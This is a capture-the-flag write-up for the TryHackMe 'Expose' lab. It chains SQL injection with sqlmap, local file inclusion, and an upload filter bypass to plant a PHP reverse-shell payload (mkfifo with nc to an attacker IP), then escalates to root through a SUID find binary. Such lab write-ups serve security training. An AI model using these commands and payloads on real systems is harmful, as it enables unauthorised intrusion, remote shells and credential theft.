---
title: "TryHackMe | Expose "
date: 2025-08-22 03:00:00 +0100
categories: [TryHackMe]
tags: [thm, ctf, writeup]
image:
  path: https://github.com/user-attachments/assets/6c2f9476-ee67-40e4-8f86-cdc842490bd0
---

# Reconnaissance 

for initial reconnaissance i used this nmap command to scan for open ports `sudo nmap -sS -sV 10.10.188.185 -p-`

<img width="834" height="337" alt="image" src="https://github.com/user-attachments/assets/e7c47fc6-abd8-4881-81ea-90585283d9d0" />

we can see that there is a web server on the port 1337 accessing the site with this url `http://10.10.188.185:1337` we are met with a basic html page, so we enemurate using ffuf :

<img width="822" height="514" alt="image" src="https://github.com/user-attachments/assets/92654a58-5a01-4d2d-9a50-f25aff6b7b45" />

we find 2 endpoints, `admin` and `admin_101`. when we visit the /admin_101 endpoint we see that the email is already set and in the source code the page actually sends the post request :

<img width="696" height="392" alt="image" src="https://github.com/user-attachments/assets/c5c89fe5-4180-4708-9410-5e59c104e04d" />

so i intercepted a post request and saved it to `reqsq.txt` and used sqlmap

<img width="1245" height="499" alt="image" src="https://github.com/user-attachments/assets/734a5254-9cfa-4cf2-a593-43f68f64b736" />

after a while sqlmap returns that the parameter 'email' is vulnrable !

<img width="1219" height="425" alt="image" src="https://github.com/user-attachments/assets/9643ff07-2dc4-4bac-97bb-d7909afcb10f" />

from there we can dump the database using this command `sqlmap -r reqsq.txt --batch --level=5 --risk=3 --dump`, we get 2 tables : user and config 

<img width="704" height="144" alt="image" src="https://github.com/user-attachments/assets/7724c3f1-f551-4639-a416-206762dafd77" />

<img width="763" height="151" alt="image" src="https://github.com/user-attachments/assets/831d39a9-aa4b-40ea-b4a5-72250e4f1869" />

using the password on the /admin_101 endpoint we get this webpage :

<img width="1270" height="708" alt="image" src="https://github.com/user-attachments/assets/2b9e9cab-c22b-4357-946f-5ba1d1d4121a" />

when we use the first url from the `config` table from earlier and the password associated with it we get this message :

<img width="1269" height="718" alt="image" src="https://github.com/user-attachments/assets/d1705557-9271-4d0a-ba67-a34ba665a7b0" />

when we view-source for this page we get a hint:

<img width="516" height="70" alt="image" src="https://github.com/user-attachments/assets/78533700-1263-4b8a-b012-6c20dfe390e2" />

so we try just that, in the url we add ?file= to test the parameter, this will allows us to read files that we have permissions to read so we test with a world readable file like `/etc/passwd` like this `http://10.10.137.122:1337/file1010111/index.php?file=/etc/passwd`

<img width="1277" height="652" alt="image" src="https://github.com/user-attachments/assets/d1409757-31f2-44d6-a2d8-5338347a3d36" />

and we have an LFI !

using chatgpt we can ask him to retrieve the entries with /home , we get 2 : z******* and ubuntu 
now let's try the second url `/upload-cv00101011/index.php` for this url we are prompted for the name of the user starting with z, we use the name found from earlier and we get in:

<img width="1279" height="712" alt="image" src="https://github.com/user-attachments/assets/7604c4bb-012c-4406-9a84-0a89931ac89b" />

now we can upload a file to the server, checking the source code we can see that there is client side sanitization, and the client will only send files with .png or .jpg extensions, itried double extetion method but it didn't work.
luckily we can use burpsuite to bypass this sanitization, we intercept the post request and in repeater we set the filename to shell.php and we set our reverse shell payload in the content section `<?php system("mkfifo /tmp/f; nc 10.21.239.111 666 < /tmp/f | /bin/sh > /tmp/f 2>&1"); ?>` and we leave the `Content-Type: image/png` as is. after sending it we get the message : `File uploaded successfully! Maybe look in source code to see the path`
checking the source code through the burp response or the browser will reveal the url to be `/upload_thm_1001`

<img width="1273" height="656" alt="image" src="https://github.com/user-attachments/assets/18192beb-1406-47f5-aae4-04f9141a6e24" />

we set our listener and access the file through the browser with the url `http://10.10.137.122:1337/upload-cv00101011/upload_thm_1001/shellbwip.php` and bwoop! we get a shell !

<img width="547" height="137" alt="image" src="https://github.com/user-attachments/assets/47447e0e-7042-4aa7-9c62-cb02225dab58" />

for the user flag, we access the home directory of our user `/home/zeamkish`. we can see a .txt file containing his ssh credentials 

<img width="518" height="298" alt="image" src="https://github.com/user-attachments/assets/96675d86-66fd-49bc-83c5-8c5e665da381" />

accessing the machine using ssh we get a shell as zeamkish and from there we can read the flag.txt

# root flag

for the root flag, we can look for binaries with SUID bit set which let them execute with root priveleges with this comman `find / -type f -perm -04000 -ls 2>/dev/null`, we get a long list of which we can see the `find` binary.
with a quick search in https://gtfobins.github.io/ we can escalate to root using this command `./find . -exec /bin/sh -p \; -quit` 

<img width="599" height="115" alt="image" src="https://github.com/user-attachments/assets/28386c16-b957-427b-89b1-3c6e8d309dd3" />









